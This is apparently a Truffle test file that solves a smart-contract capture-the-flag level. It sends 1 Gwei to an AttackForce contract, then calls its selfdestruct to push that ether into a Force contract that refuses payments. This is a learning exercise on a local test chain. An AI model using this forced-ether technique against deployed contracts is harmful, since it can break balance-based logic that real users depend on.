const Force = artifacts.require("Force");
const AttackForce = artifacts.require("AttackForce");
// const Web3 = require("web3");
// const web3 = new Web3(process.env.LOCAL_PROVIDER)

let forceInstance
let attackForceInstance

contract('Fallback', (accounts) => {

  before(async () => {
    forceInstance = await Force.deployed()
    attackForceInstance = await AttackForce.deployed()
  })

  it('Sanity check', async () => {
    console.log("Force instance: ", forceInstance);
    console.log("AttackForce instance: ", attackForceInstance);
  });

  it('Force has a balance of 0 ether', async () => {
    let balance = await web3.eth.getBalance(forceInstance.address)
    assert.equal(balance, 0, "initial balance is not Zero")
    console.log(balance);
  });

  it('Send 1 Gwei to AttackForce', async () => {
    await web3.eth.sendTransaction({from: accounts[0], to: AttackForce.address, value: web3.utils.toWei("1", "Gwei")})
    let balance = await web3.eth.getBalance(attackForceInstance.address)
    assert.equal(balance, web3.utils.toWei("1", "Gwei"), "AttackForce balance is not correct")
    console.log(balance);
  });

  it('Call selfdestruct on AttackForce and Force receives the balance of AttackForce', async () => {
    await attackForceInstance.destroy()
    let balance = await web3.eth.getBalance(forceInstance.address)
    assert.equal(balance, web3.utils.toWei("1", "Gwei"), "Force balance is not correct")
    console.log(balance);
  });

  
});
